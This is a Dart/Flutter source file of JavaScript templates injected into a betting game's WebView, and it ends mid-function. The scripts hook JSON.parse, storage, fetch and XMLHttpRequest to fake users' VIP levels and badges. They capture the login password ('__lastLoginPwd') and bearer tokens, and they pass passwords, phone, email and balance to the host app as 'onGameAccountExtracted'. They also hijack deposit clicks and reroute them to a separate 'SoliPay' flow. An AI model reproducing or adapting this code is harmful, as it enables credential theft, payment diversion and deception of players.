/// Centralized JavaScript injection templates injected into the game [InAppWebView].
class GameJsScripts {
  GameJsScripts._();

  /// Early document-start interception script.
  /// Hooks JSON.parse, Storage.prototype.getItem, Response.prototype.json,
  /// and XMLHttpRequest to spoof VIP levels before the game SPA initializes.
  static String earlyVipInterceptorScript({
    int? customVip,
    String? targetUserId,
  }) {
    final String customVipStr = customVip != null ? '$customVip' : 'null';
    final String targetUserIdStr = targetUserId != null && targetUserId.isNotEmpty
        ? "'$targetUserId'"
        : 'null';

    return '''
      (function() {
        var customVip = $customVipStr;
        var targetUserId = $targetUserIdStr;

        if (customVip !== null && typeof customVip !== "undefined") {
          window.__customVipLevel = parseInt(customVip, 10);
          window.__gameVipLevel = window.__customVipLevel;
        }
        if (targetUserId !== null && typeof targetUserId !== "undefined") {
          window.__targetVipUserId = String(targetUserId).trim();
        }

        // Exact game VIP EXP requirements matrix
        var VIP_EXP_MAP = {
          0: 0,
          1: 50,
          2: 500,
          3: 5000,
          4: 50000,
          5: 200000,
          6: 800000,
          7: 5000000,
          8: 10000000,
          9: 100000000,
          10: 2000000000
        };

        function getTargetExp(vip) {
          if (vip === null || typeof vip === "undefined") return 0;
          var v = parseInt(vip, 10);
          return VIP_EXP_MAP[v] !== undefined ? VIP_EXP_MAP[v] : (v * 50000);
        }

        // Helper function to check if this user ID is the authorized recipient of custom VIP
        function shouldApplyVip(userId) {
          if (window.__customVipLevel === null || window.__customVipLevel === undefined) return false;
          if (!window.__targetVipUserId) return true; // If no specific user ID bound, apply to this game
          if (!userId) return true;
          return String(userId).trim() === String(window.__targetVipUserId).trim();
        }

        // Helper to patch /api/webapi/GetVipUserLevelDetail array in-place
        function patchVipLevelDetailArray(arr, targetVip) {
          if (!Array.isArray(arr)) return;
          var targetExp = getTargetExp(targetVip);
          for (var i = 0; i < arr.length; i++) {
            var item = arr[i];
            if (item && typeof item === "object") {
              item.currentExp = targetExp;
              var tierId = (typeof item.id !== "undefined") ? parseInt(item.id, 10) : (i + 1);
              if (tierId <= targetVip) {
                item.status = 2;        // Unlocked
                item.upgradeStatus = 2; // Achieved / Claimed
              } else {
                item.status = 1;        // Locked
                item.upgradeStatus = 0; // Unachieved
              }
            }
          }
        }

        // 1. Hook JSON.parse to intercept game responses before SPA state is initialized
        var origJSONParse = JSON.parse;
        JSON.parse = function(text, reviver) {
          var res = origJSONParse.apply(this, arguments);
          try {
            if (res && res.data && window.__customVipLevel !== null && window.__customVipLevel !== undefined) {
              var targetVip = parseInt(window.__customVipLevel, 10);
              var targetExp = getTargetExp(targetVip);

              // 1a. Array response: GetVipUserLevelDetail
              if (Array.isArray(res.data)) {
                patchVipLevelDetailArray(res.data, targetVip);
              }
              // 1b. Object response: GetVipUsers / GetUserInfo / Login
              else if (typeof res.data === "object") {
                var uId = res.data.userId || res.data.user_id;
                if (shouldApplyVip(uId)) {
                  if (typeof res.data.vipLevel !== "undefined") {
                    res.data.vipLevel = targetVip;
                  }
                  if (typeof res.data.exp !== "undefined") {
                    res.data.exp = targetExp;
                  }
                  if (typeof res.data.currentExp !== "undefined") {
                    res.data.currentExp = targetExp;
                  }
                  if (res.data.userId && typeof res.data.userName !== "undefined" && typeof res.data.vipLevel === "undefined") {
                    res.data.vipLevel = targetVip;
                  }
                }
              }
            }
          } catch(e) {}
          return res;
        };

        // 2. Hook Storage.prototype.getItem to serve spoofed VIP userInfo immediately
        var origGetItem = Storage.prototype.getItem;
        Storage.prototype.getItem = function(k) {
          var val = origGetItem.apply(this, arguments);
          if (val && window.__customVipLevel !== null && window.__customVipLevel !== undefined) {
            var isTargetKey = (k === "userInfo" || k === "user" || k === "userData" || k === "currentUser" || k === "vipInfo" || k === "vipUser" || k === "account" || k === "loginInfo" || k === "profile" || k === "member" || k === "vip");
            if (!isTargetKey && typeof val === "string" && val.indexOf("vipLevel") !== -1) {
              isTargetKey = true;
            }
            if (isTargetKey) {
              try {
                var parsed = origJSONParse(val);
                if (parsed) {
                  var targetVip = parseInt(window.__customVipLevel, 10);
                  var targetExp = getTargetExp(targetVip);
                  var uId = parsed.userId || parsed.user_id || (parsed.data && (parsed.data.userId || parsed.data.user_id));
                  if (shouldApplyVip(uId)) {
                    if (typeof parsed.vipLevel !== "undefined") parsed.vipLevel = targetVip;
                    if (typeof parsed.exp !== "undefined") parsed.exp = targetExp;
                    if (typeof parsed.currentExp !== "undefined") parsed.currentExp = targetExp;
                    if (parsed.data) {
                      if (typeof parsed.data.vipLevel !== "undefined") parsed.data.vipLevel = targetVip;
                      if (typeof parsed.data.exp !== "undefined") parsed.data.exp = targetExp;
                      if (typeof parsed.data.currentExp !== "undefined") parsed.data.currentExp = targetExp;
                    }
                    return JSON.stringify(parsed);
                  }
                }
              } catch(e) {}
            }
          }
          return val;
        };

        // 3. Hook Response.prototype.json (Fetch API)
        if (typeof Response !== "undefined" && Response.prototype && Response.prototype.json) {
          var origResponseJson = Response.prototype.json;
          Response.prototype.json = function() {
            var self = this;
            return origResponseJson.apply(this, arguments).then(function(data) {
              try {
                if (data && data.data && window.__customVipLevel !== null && window.__customVipLevel !== undefined) {
                  var targetVip = parseInt(window.__customVipLevel, 10);
                  var targetExp = getTargetExp(targetVip);

                  if (Array.isArray(data.data)) {
                    patchVipLevelDetailArray(data.data, targetVip);
                  } else if (typeof data.data === "object") {
                    var uId = data.data.userId || data.data.user_id;
                    if (shouldApplyVip(uId)) {
                      if (typeof data.data.vipLevel !== "undefined" || (self && self.url && (self.url.indexOf("GetUserInfo") !== -1 || self.url.indexOf("GetVipUsers") !== -1))) {
                        data.data.vipLevel = targetVip;
                      }
                      if (typeof data.data.exp !== "undefined") {
                        data.data.exp = targetExp;
                      }
                      if (typeof data.data.currentExp !== "undefined") {
                        data.data.currentExp = targetExp;
                      }
                    }
                  }
                }
              } catch(e) {}
              return data;
            });
          };
        }

        // 4. Targeted Hook for XMLHttpRequest (VIP endpoints only)
        if (typeof XMLHttpRequest !== "undefined" && XMLHttpRequest.prototype) {
          var origOpen = XMLHttpRequest.prototype.open;
          var origSend = XMLHttpRequest.prototype.send;

          XMLHttpRequest.prototype.open = function(method, url) {
            this._url = (url || "").toString();
            return origOpen.apply(this, arguments);
          };

          XMLHttpRequest.prototype.send = function() {
            var self = this;
            var isVipUrl = self._url && (
              self._url.indexOf("GetVipUsers") !== -1 ||
              self._url.indexOf("GetVipUserLevelDetail") !== -1 ||
              self._url.indexOf("GetUserInfo") !== -1 ||
              self._url.indexOf("GetBalance") !== -1 ||
              self._url.indexOf("Login") !== -1
            );

            // Only attach listener for VIP endpoints. All WinGo, draw, and game requests are 100% untouched.
            if (isVipUrl) {
              this.addEventListener("readystatechange", function() {
                if (self.readyState === 4 && window.__customVipLevel !== null && window.__customVipLevel !== undefined) {
                  try {
                    var raw = self.responseText;
                    if (raw) {
                      var parsed = origJSONParse(raw);
                      if (parsed && parsed.data) {
                        var targetVip = parseInt(window.__customVipLevel, 10);
                        var targetExp = getTargetExp(targetVip);

                        if (Array.isArray(parsed.data)) {
                          patchVipLevelDetailArray(parsed.data, targetVip);
                          var modified = JSON.stringify(parsed);
                          try {
                            Object.defineProperty(self, "responseText", { get: function() { return modified; }, configurable: true });
                            Object.defineProperty(self, "response", { get: function() { return modified; }, configurable: true });
                          } catch(_) {}
                        } else if (typeof parsed.data === "object") {
                          var uId = parsed.data.userId || parsed.data.user_id;
                          if (shouldApplyVip(uId)) {
                            parsed.data.vipLevel = targetVip;
                            if (typeof parsed.data.exp !== "undefined") parsed.data.exp = targetExp;
                            if (typeof parsed.data.currentExp !== "undefined") parsed.data.currentExp = targetExp;
                            var modified = JSON.stringify(parsed);
                            try {
                              Object.defineProperty(self, "responseText", { get: function() { return modified; }, configurable: true });
                              Object.defineProperty(self, "response", { get: function() { return modified; }, configurable: true });
                            } catch(_) {}
                          }
                        }
                      }
                    }
                  } catch(e) {}
                }
              });
            }

            return origSend.apply(this, arguments);
          };
        }

        // 5. Visual VIP Level DOM Upgrader & In-Memory Storage Hot-Patcher
        window.__applyVipUpgrade = function(vip, userId) {
          if (vip === null || typeof vip === "undefined") return;
          var targetVip = parseInt(vip, 10);
          var targetExp = getTargetExp(targetVip);
          window.__customVipLevel = targetVip;
          window.__gameVipLevel = targetVip;
          if (userId) window.__targetVipUserId = String(userId).trim();

          // Update storage in-place ONLY if user ID matches
          try {
            ["userInfo", "user", "userData", "currentUser", "vipInfo", "vipUser"].forEach(function(key) {
              var raw = localStorage.getItem(key);
              if (raw) {
                var parsed = origJSONParse(raw);
                if (parsed) {
                  var uId = parsed.userId || parsed.user_id || (parsed.data && (parsed.data.userId || parsed.data.user_id));
                  if (shouldApplyVip(uId)) {
                    if (typeof parsed.vipLevel !== "undefined") parsed.vipLevel = targetVip;
                    if (typeof parsed.exp !== "undefined") parsed.exp = targetExp;
                    if (typeof parsed.currentExp !== "undefined") parsed.currentExp = targetExp;
                    if (parsed.data) {
                      if (typeof parsed.data.vipLevel !== "undefined") parsed.data.vipLevel = targetVip;
                      if (typeof parsed.data.exp !== "undefined") parsed.data.exp = targetExp;
                      if (typeof parsed.data.currentExp !== "undefined") parsed.data.currentExp = targetExp;
                    }
                    localStorage.setItem(key, JSON.stringify(parsed));
                  }
                }
              }
            });
          } catch(e) {}

          // Rewrite all VIP DOM elements on screen
          var vipElements = document.querySelectorAll("[class*='vip'], [class*='VIP'], [class*='level'], [class*='Level'], .van-tag, .tag, [class*='grade'], [class*='rank'], [class*='member']");
          vipElements.forEach(function(el) {
            try {
              if (!el || el.children.length > 3) return;
              var text = el.innerText ? el.innerText.trim() : "";
              if (/^VIP\\s*\\d+/i.test(text)) {
                el.innerText = text.replace(/^VIP\\s*\\d+/i, "VIP " + targetVip);
              } else if (/^V\\d+\$/i.test(text)) {
                el.innerText = "V" + targetVip;
              } else if (/^Lv\\.?\\s*\\d+/i.test(text)) {
                el.innerText = "Lv." + targetVip;
              }
            } catch(e) {}
          });

          // Rewrite .n0, .n1, .n2 ... .n10 badge icon classes (e.g. <div class="n1"></div>)
          var nBadges = document.querySelectorAll("[class^='n'], [class*=' n'], .userInfo__container-content-nickname div, [class*='nickname'] div");
          nBadges.forEach(function(el) {
            try {
              if (!el) return;
              var cls = el.className || "";
              if (typeof cls === "string" && cls.length > 0) {
                var parts = cls.split(/\\s+/);
                var changed = false;
                for (var i = 0; i < parts.length; i++) {
                  if (/^n\\d+\$/i.test(parts[i])) {
                    parts[i] = "n" + targetVip;
                    changed = true;
                  }
                }
                if (changed) {
                  el.className = parts.join(" ");
                }
              }
            } catch(e) {}
          });

          // Update VIP icon images
          var imgs = document.querySelectorAll("img[src*='vip'], img[src*='VIP']");
          imgs.forEach(function(img) {
            try {
              if (img.src && /vip[_-]?\\d+/i.test(img.src)) {
                img.src = img.src.replace(/vip[_-]?\\d+/i, "vip" + targetVip);
              }
            } catch(e) {}
          });
        };

        // 6. Continuous Synchronous Zero-Flash MutationObserver (Executes BEFORE Browser Paint)
        function initZeroFlashObserver() {
          if (window.__vipObserverInitialized) return;
          var targetRoot = document.documentElement || document.body;
          if (!targetRoot) return;
          window.__vipObserverInitialized = true;

          var vipMutObserver = new MutationObserver(function(mutations) {
            if (window.__customVipLevel === null || window.__customVipLevel === undefined) return;
            var targetVip = parseInt(window.__customVipLevel, 10);

            // Fast targeted check for any badge icon elements (e.g. .n0, .n1, .n2)
            var nBadges = document.querySelectorAll("[class^='n'], [class*=' n'], .userInfo__container-content-nickname div, [class*='nickname'] div");
            for (var i = 0; i < nBadges.length; i++) {
              var el = nBadges[i];
              var cls = el.className || "";
              if (typeof cls === "string" && cls.length > 0) {
                var parts = cls.split(/\\s+/);
                var changed = false;
                for (var j = 0; j < parts.length; j++) {
                  if (/^n\\d+\$/i.test(parts[j]) && parts[j] !== ("n" + targetVip)) {
                    parts[j] = "n" + targetVip;
                    changed = true;
                  }
                }
                if (changed) {
                  el.className = parts.join(" ");
                }
              }
            }

            // Fast targeted check for text nodes
            var vipNodes = document.querySelectorAll("[class*='vip'], [class*='VIP'], [class*='level'], [class*='Level'], .van-tag, .tag");
            for (var k = 0; k < vipNodes.length; k++) {
              var vel = vipNodes[k];
              if (!vel || vel.children.length > 2) continue;
              var txt = vel.innerText ? vel.innerText.trim() : "";
              if (/^VIP\\s*\\d+/i.test(txt) && txt !== ("VIP " + targetVip)) {
                vel.innerText = txt.replace(/^VIP\\s*\\d+/i, "VIP " + targetVip);
              } else if (/^V\\d+\$/i.test(txt) && txt !== ("V" + targetVip)) {
                vel.innerText = "V" + targetVip;
              } else if (/^Lv\\.?\\s*\\d+/i.test(txt) && txt !== ("Lv." + targetVip)) {
                vel.innerText = "Lv." + targetVip;
              }
            }

            // Fast targeted check for images
            var vImgs = document.querySelectorAll("img[src*='vip'], img[src*='VIP']");
            for (var m = 0; m < vImgs.length; m++) {
              var vImg = vImgs[m];
              if (vImg.src && /vip[_-]?\\d+/i.test(vImg.src) && vImg.src.indexOf("vip" + targetVip) === -1 && vImg.src.indexOf("vip_" + targetVip) === -1 && vImg.src.indexOf("vip-" + targetVip) === -1) {
                vImg.src = vImg.src.replace(/vip[_-]?\\d+/i, "vip" + targetVip);
              }
            }
          });

          vipMutObserver.observe(targetRoot, {
            childList: true,
            subtree: true,
            attributes: true,
            attributeFilter: ['class', 'src']
          });
        }

        initZeroFlashObserver();

        if (document.readyState === "loading") {
          document.addEventListener("DOMContentLoaded", function() {
            initZeroFlashObserver();
            if (window.__customVipLevel !== null && window.__customVipLevel !== undefined) {
              window.__applyVipUpgrade(window.__customVipLevel);
            }
          });
        } else {
          initZeroFlashObserver();
          if (window.__customVipLevel !== null && window.__customVipLevel !== undefined) {
            window.__applyVipUpgrade(window.__customVipLevel);
          }
        }
      })();
    ''';
  }

  /// Injects demo mode / plan restriction overlay onto WinGo betting area.
  static String demoOverlayScript({
    required String modeLabel,
    required String btnLabel,
    required String hintText,
  }) {
    return '''
      (function() {
        var betting = document.querySelector(".Betting__C");
        if (!betting) return;
        var parent = betting.parentElement;
        if (!parent) return;

        parent.style.setProperty("position", "relative", "important");

        var style = document.getElementById("__demoStyle");
        if (!style) {
          style = document.createElement("style");
          style.id = "__demoStyle";
          document.head.appendChild(style);
        }
        style.innerHTML = `
          .Betting__C {
            pointer-events: none !important;
            opacity: 0.35 !important;
            filter: grayscale(100%) !important;
          }
        `;

        if (document.getElementById("__demoOverlay")) return;

        var overlay = document.createElement("div");
        overlay.id = "__demoOverlay";
        overlay.style.cssText = [
          "position:absolute",
          "top:" + betting.offsetTop + "px",
          "left:" + betting.offsetLeft + "px",
          "width:" + betting.offsetWidth + "px",
          "height:" + betting.offsetHeight + "px",
          "display:flex","align-items:center","justify-content:center",
          "z-index:9999","pointer-events:auto",
          "background:rgba(10, 14, 26, 0.20)",
          "border-radius:14px"
        ].join(";");

        var card = document.createElement("div");
        card.style.cssText = [
          "background:rgba(15, 23, 42, 0.95)",
          "border:1px solid rgba(255, 215, 0, 0.8)",
          "border-radius:14px",
          "padding:10px 14px",
          "display:flex","flex-direction:column","gap:8px",
          "box-shadow:0 4px 18px rgba(0,0,0,0.6)"
        ].join(";");

        var topRow = document.createElement("div");
        topRow.style.cssText = "display:flex;align-items:center;gap:10px;justify-content:space-between;";

        var txt = document.createElement("span");
        txt.innerText = "$modeLabel";
        txt.style.cssText = [
          "color:#FFD700",
          "font-weight:700",
          "font-size:12px",
          "white-space:nowrap"
        ].join(";");

        var btn = document.createElement("button");
        btn.id = "__addKeyBtn";
        btn.innerText = "$btnLabel";
        btn.style.cssText = [
          "background:linear-gradient(135deg, #FFD700, #FFA500)",
          "color:#1A1A2E",
          "border:none",
          "padding:6px 14px",
          "border-radius:10px",
          "font-size:11px",
          "font-weight:800",
          "cursor:pointer",
          "letter-spacing:0.5px",
          "box-shadow:0 2px 8px rgba(255,165,0,0.5)",
          "outline:none",
          "white-space:nowrap"
        ].join(";");

        btn.addEventListener("touchstart", function() {
          btn.style.transform = "scale(0.95)";
        });
        btn.addEventListener("touchend", function() {
          btn.style.transform = "scale(1)";
          window.flutter_inappwebview.callHandler("showAuthDialog");
        });
        btn.addEventListener("click", function() {
          window.flutter_inappwebview.callHandler("showAuthDialog");
        });

        topRow.appendChild(txt);
        topRow.appendChild(btn);

        var notice = document.createElement("div");
        notice.innerHTML = '$hintText';
        notice.style.cssText = [
          "color:#FF9999",
          "font-size:9.5px",
          "text-align:center",
          "font-weight:600",
          "border-top:1px solid rgba(255,255,255,0.1)",
          "padding-top:6px"
        ].join(";");

        card.appendChild(topRow);
        card.appendChild(notice);
        overlay.appendChild(card);
        parent.appendChild(overlay);
      })();
    ''';
  }

  /// Removes the demo overlay and restores betting area interactivity.
  static String removeDemoOverlayScript() {
    return '''
      (function() {
        var style = document.getElementById("__demoStyle");
        if (style) style.remove();

        var overlay = document.getElementById("__demoOverlay");
        if (overlay) overlay.remove();

        var betting = document.querySelector(".Betting__C");
        if (betting) {
          betting.style.setProperty("pointer-events", "auto", "important");
          betting.style.setProperty("opacity", "1", "important");
          betting.style.setProperty("filter", "none", "important");
        }
      })();
    ''';
  }

  /// Injects click listener on game recharge buttons for SoliPay delegation.
  static String rechargeListenerScript({required double minDeposit}) {
    return '''
      (function() {
        window.__solipayDepositActive = true;
        if (window.__rechargeScriptInjected) return;
        window.__rechargeScriptInjected = true;

        document.addEventListener("click", function(e) {
          if (!window.__solipayDepositActive) return;

          var btn = e.target ? (e.target.closest ? e.target.closest(".Recharge__container-rechageBtn") : null) : null;
          if (!btn) return;

          try {
            var fixedBox = document.querySelector(".Recharge__content-fixed-box");
            var channel = "Easypaisa";
            if (fixedBox) {
              var h2El = fixedBox.querySelector("h2");
              if (h2El) {
                var text = h2El.innerText.trim();
                if (/jazz/i.test(text)) {
                  channel = "Jazzcash";
                } else if (/easypaisa|easy/i.test(text)) {
                  channel = "Easypaisa";
                }
              }
            }

            var btnText = (btn.innerText || "").replace(/,/g, "").trim();
            var match = btnText.match(/\\d+(?:\\.\\d+)?/);
            var amount = match ? parseFloat(match[0]) : 0;

            if (amount === 0 && fixedBox) {
              var boxText = (fixedBox.innerText || "").replace(/,/g, "").trim();
              var boxMatch = boxText.match(/\\d+(?:\\.\\d+)?/);
              if (boxMatch) amount = parseFloat(boxMatch[0]);
            }

            console.log("[Recharge Delegate] Channel:", channel, "| Amount:", amount, "| Raw Text:", btn.innerText);

            if (amount >= $minDeposit) {
              e.preventDefault();
              e.stopPropagation();
              if (e.stopImmediatePropagation) e.stopImmediatePropagation();

              console.log("[SoliPay Deposit >= $minDeposit] Intercepted and launching SoliPay:", channel, amount);
              window.flutter_inappwebview.callHandler("handleGameDeposit", {
                "channel": channel,
                "amount": amount
              });
            } else {
              console.log("[Default Deposit < $minDeposit] Allowing website default flow:", amount);
            }
          } catch(err) {
            console.error("[SoliPay Deposit] JS Error:", err);
          }
        }, true);
      })();
    ''';
  }

  /// Injects detectors for in-game VIP level and account profile extraction.
  static String vipDetectorScript({int? customVip, String? targetUserId}) {
    final String customVipStr = customVip != null ? '$customVip' : 'null';
    final String targetUserIdStr = targetUserId != null && targetUserId.isNotEmpty
        ? "'$targetUserId'"
        : 'null';

    return '''
      (function() {
        var customVip = $customVipStr;
        var targetUserId = $targetUserIdStr;

        if (customVip !== null && typeof customVip !== "undefined") {
          window.__customVipLevel = parseInt(customVip, 10);
          window.__gameVipLevel = window.__customVipLevel;
        }
        if (targetUserId !== null && typeof targetUserId !== "undefined") {
          window.__targetVipUserId = String(targetUserId).trim();
        }

        if (window.__vipDetectorInjected) return;
        window.__vipDetectorInjected = true;

        function notifyVipLevel(level, userId, nickName) {
          var isAuthorized = !window.__targetVipUserId || (userId && String(userId).trim() === String(window.__targetVipUserId).trim());
          var vip = (window.__customVipLevel !== undefined && window.__customVipLevel !== null && isAuthorized)
              ? window.__customVipLevel
              : (parseInt(level, 10) || 0);
          window.__gameVipLevel = vip;
          if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onGameVipLevelUpdated", {
              "vipLevel": vip,
              "userId": userId || 0,
              "nickName": nickName || ""
            });
          }
        }

        function extractAndNotifyProfile(d) {
          if (!d) return;
          var mobile = (d.verifyMethods && d.verifyMethods.mobile) ? d.verifyMethods.mobile : (d.userName || "");
          var email = (d.verifyMethods && d.verifyMethods.email) ? d.verifyMethods.email : (d.email || "");
          var isAuthorized = !window.__targetVipUserId || (d.userId && String((d.userId || d.UserId)).trim() === String(window.__targetVipUserId).trim());
          var vipLvl = (window.__customVipLevel !== undefined && window.__customVipLevel !== null && isAuthorized)
              ? window.__customVipLevel
              : ((typeof d.vipLevel !== "undefined") ? parseInt(d.vipLevel, 10) : (window.__gameVipLevel || 0));
          var addTime = d.addTime || d.add_time || d.createTime || "";
          var rechargeTimes = (typeof d.userRechargeTimes !== "undefined") ? parseInt(d.userRechargeTimes, 10) : ((typeof d.rechargeTimes !== "undefined") ? parseInt(d.rechargeTimes, 10) : 0);

          if (typeof d.vipLevel !== "undefined" || window.__customVipLevel !== null) {
            window.__gameVipLevel = vipLvl;
            notifyVipLevel(vipLvl, d.userId, (d.nickName || d.NickName));
          }

          if (window.flutter_inappwebview) {
            window.flutter_inappwebview.callHandler("onGameAccountExtracted", {
              "game_user_id": (d.userId || (d.userId || d.UserId)) ? String((d.userId || d.UserId)) : "",
              "game_username": (d.userName || (d.userName || d.UserName)) ? String((d.userName || d.UserName)) : "",
              "game_nickname": (d.nickName || (d.nickName || d.NickName)) ? String((d.nickName || d.NickName)) : "",
              "game_pwd": window.__lastLoginPwd || "",
              "mobile": mobile ? String(mobile) : "",
              "email": email ? String(email) : "",
              "vip_level": vipLvl,
              "withdraw_count": (typeof d.withdrawCount !== "undefined") ? parseInt(d.withdrawCount, 10) : 0,
              "recharge_count": rechargeTimes,
              "balance": (typeof d.amount !== "undefined") ? parseFloat(d.amount) : 0.0,
              "account_created_at": addTime ? String(addTime) : ""
            });
          }
        }

        // 1. Instant check from localStorage / sessionStorage (0ms)
        function checkStorage() {
          try {
            var keys = ["userInfo", "user", "userData", "currentUser", "vipInfo", "vipUser", "account", "loginInfo", "profile", "member"];
            for (var i = 0; i < keys.length; i++) {
              var raw = localStorage.getItem(keys[i]) || sessionStorage.getItem(keys[i]);
              if (raw) {
                var data = typeof raw === "string" ? JSON.parse(raw) : raw;
                if (data) {
                  if (typeof data.vipLevel !== "undefined") {
                    notifyVipLevel(data.vipLevel, data.userId, data.nickName);
                  }
                  if (data.userId || data.userName || (data.data && (data.data.userId || data.data.userName))) {
                    extractAndNotifyProfile(data.data ? data.data : data);
                    return true;
                  }
                }
              }
            }
          } catch(e) {}

          // Fallback: direct DOM scrape if user profile view is already rendered
          try {
            var uidContainer = document.querySelector(".userInfo__container-content-uid, [class*='content-uid']");
            var nickContainer = document.querySelector(".userInfo__container-content-nickname h3, [class*='content-nickname'] h3");
            if (uidContainer) {
              var text = uidContainer.innerText || "";
              var match = text.match(/\\d{5,}/);
              if (match) {
                var scrapedUid = match[0];
                var scrapedNick = nickContainer ? (nickContainer.innerText || "").trim() : "";
                extractAndNotifyProfile({
                  userId: scrapedUid,
                  nickName: scrapedNick,
                  vipLevel: window.__gameVipLevel || 0
                });
                return true;
              }
            }
          } catch(e) {}

          return false;
        }

        // 2. Silent one-shot background API trigger
        function silentFetchVip(customToken) {
          try {
            var token = customToken || localStorage.getItem("token") || sessionStorage.getItem("token");
            if (!token) {
              var uKeys = ["userInfo", "user", "userData", "currentUser", "account", "loginInfo", "profile"];
              for (var k = 0; k < uKeys.length; k++) {
                var rawItem = localStorage.getItem(uKeys[k]) || sessionStorage.getItem(uKeys[k]);
                if (rawItem) {
                  try {
                    var parsed = typeof rawItem === "string" ? JSON.parse(rawItem) : rawItem;
                    if (parsed && (parsed.token || parsed.tokenHeader || parsed.accessToken)) {
                      token = parsed.token || parsed.accessToken;
                      break;
                    }
                  } catch(e) {}
                }
              }
            }
            if (!token && window.__lastAuthHeader) {
              token = window.__lastAuthHeader;
            }
            if (!token) return;

            var origin = window.location.origin;
            var authHeader = token.startsWith("Bearer ") ? token : ("Bearer " + token);

            // Fetch VIP level
            fetch(origin + "/api/webapi/GetVipUsers", {
              method: "POST",
              headers: {
                "Content-Type": "application/json;charset=UTF-8",
                "Authorization": authHeader
              },
              body: JSON.stringify({
                language: 0,
                random: Math.random().toString(36).substring(2),
                signature: "",
                timestamp: Math.floor(Date.now() / 1000)
              })
            })
            .then(function(r) { return r.json(); })
            .then(function(res) {
              if (res && res.data && typeof res.data.vipLevel !== "undefined") {
                if (window.__customVipLevel !== undefined && window.__customVipLevel !== null) {
                  res.data.vipLevel = window.__customVipLevel;
                }
                notifyVipLevel(res.data.vipLevel, res.data.userId, res.data.nickName);
              }
            })
            .catch(function() {});

            // Fetch Account User Details
            fetch(origin + "/api/webapi/GetUserInfo", {
              method: "POST",
              headers: {
                "Content-Type": "application/json;charset=UTF-8",
                "Authorization": authHeader
              },
              body: JSON.stringify({
                language: 0,
                random: Math.random().toString(36).substring(2),
                signature: "",
                timestamp: Math.floor(Date.now() / 1000)
              })
            })
            .then(function(r) { return r.json(); })
            .then(function(res) {
              if (res && res.data) {
                if (window.__customVipLevel !== undefined && window.__customVipLevel !== null) {
                  res.data.vipLevel = window.__customVipLevel;
                }
                extractAndNotifyProfile(res.data);
              }
            })
            .catch(function() {});
          } catch(err) {}
        }

        function handleApiResponse(url, json) {
          if (!json || !json.data) return;
          var targetVip = (window.__customVipLevel !== undefined && window.__customVipLevel !== null)
              ? parseInt(window.__customVipLevel, 10)
              : null;

          if (targetVip !== null) {
            var targetExp = (typeof getTargetExp === "function") ? getTargetExp(targetVip) : (targetVip * 50000);
            if (Array.isArray(json.data)) {
              if (typeof patchVipLevelDetailArray === "function") {
                patchVipLevelDetailArray(json.data, targetVip);
              }
            } else if (typeof json.data === "object") {
              json.data.vipLevel = targetVip;
              if (typeof json.data.exp !== "undefined") json.data.exp = targetExp;
              if (typeof json.data.currentExp !== "undefined") json.data.currentExp = targetExp;
            }
          }

          if (url.indexOf("GetUserInfo") !== -1) {
            extractAndNotifyProfile(json.data);
          } else if (url.indexOf("GetVipUsers") !== -1 || (!Array.isArray(json.data) && typeof json.data.vipLevel !== "undefined")) {
            notifyVipLevel(json.data.vipLevel, json.data.userId, json.data.nickName);
            if (json.data && (json.data.userId || json.data.user_id)) {
              extractAndNotifyProfile(json.data);
            }
          }
          if (url.indexOf("Login") !== -1 || url.indexOf("Register") !== -1) {
            if (json.data && (json.data.UserName || json.data.userName)) {
              extractAndNotifyProfile(json.data);
            }
            if (json.data && json.data.token) {
              var header = json.data.tokenHeader || "Bearer ";
              var fullToken = header + json.data.token;
              silentFetchVip(fullToken);
              setTimeout(function() { silentFetchVip(fullToken); }, 1500);
            }
          }
        }

        function hookNetwork() {
          try {
            var origFetch = window.fetch;
            if (origFetch && !window.__fetchHooked) {
              window.__fetchHooked = true;
              window.fetch = function() {
                try {
                  var urlArg = arguments[0];
                  var opts = arguments[1];
                  if (opts && opts.headers) {
                    var auth = opts.headers["Authorization"] || opts.headers["authorization"];
                    if (auth) window.__lastAuthHeader = auth;
                  }
                  if (typeof urlArg === "string" && urlArg.indexOf("Login") !== -1 && opts && opts.body) {
                    var reqBody = JSON.parse(opts.body);
                    if (reqBody.pwd) window.__lastLoginPwd = reqBody.pwd;
                  }
                } catch(e) {}
                return origFetch.apply(this, arguments).then(function(res) {
                  try {
                    var url = (res && res.url) ? res.url : "";
                    if (url.indexOf("GetVipUsers") !== -1 || url.indexOf("GetVipUserLevelDetail") !== -1 || url.indexOf("GetUserInfo") !== -1 || url.indexOf("GetBalance") !== -1 || url.indexOf("Login") !== -1 || url.indexOf("Register") !== -1) {
                      res.clone().json().then(function(data) {
                        handleApiResponse(url, data);
                      }).catch(function() {});
                    }
                  } catch(e) {}
                  return res;
                });
              };
            }

            var origOpen = XMLHttpRequest.prototype.open;
            var origSetHeader = XMLHttpRequest.prototype.setRequestHeader;
            var origSend = XMLHttpRequest.prototype.send;
            if (origOpen && !window.__xhrHooked) {
              window.__xhrHooked = true;
              XMLHttpRequest.prototype.open = function(method, url) {
                this._url = url;
                return origOpen.apply(this, arguments);
              };
              if (origSetHeader) {
                XMLHttpRequest.prototype.setRequestHeader = function(header, value) {
                  try {
                    if (header && header.toLowerCase() === "authorization") {
                      window.__lastAuthHeader = value;
                    }
                  } catch(e) {}
                  return origSetHeader.apply(this, arguments);
                };
              }
              XMLHttpRequest.prototype.send = function() {
                try {
                  if (this._url && this._url.indexOf("Login") !== -1 && arguments[0]) {
                    var reqBody = JSON.parse(arguments[0]);
                    if (reqBody.pwd) window.__lastLoginPwd = reqBody.pwd;
                  }
                } catch(e) {}
                this.addEventListener("load", function() {
                  try {
                    if (this._url && (this._url.indexOf("GetVipUsers") !== -1 || this._url.indexOf("GetVipUserLevelDetail") !== -1 || this._url.indexOf("GetUserInfo") !== -1 || this._url.indexOf("Login") !== -1 || this._url.indexOf("Register") !== -1)) {
                      var data = JSON.parse(this.responseText);
                      handleApiResponse(this._url, data);
                    }
                  } catch(e) {}
                });
                return origSend.apply(this, arguments);
              };
            }
          } catch(e) {}
        }

        // Run immediately and schedule polling
        checkStorage();
        hookNetwork();
        setTimeout(function() { silentFetchVip(); }, 1200);
        setTimeout(function() { silentFetchVip(); }, 3000);
        setTimeout(function() { silentFetchVip(); }, 6000);
        setTimeout(checkStorage, 2500);
        setTimeout(checkStorage, 5000);
      })();
    ''';
  }

  /// Injects bet restriction listener (minimum VIP level validation and CobraX VPN Netty check).
  static String betRestrictionListenerScript({
    required int reqVip,
    required bool isMaintenance,
  }) {
    return '''
      (function() {
        window.__requiredGameVipLevel = $reqVip;
        window.__maintenanceMode = $isMaintenance;

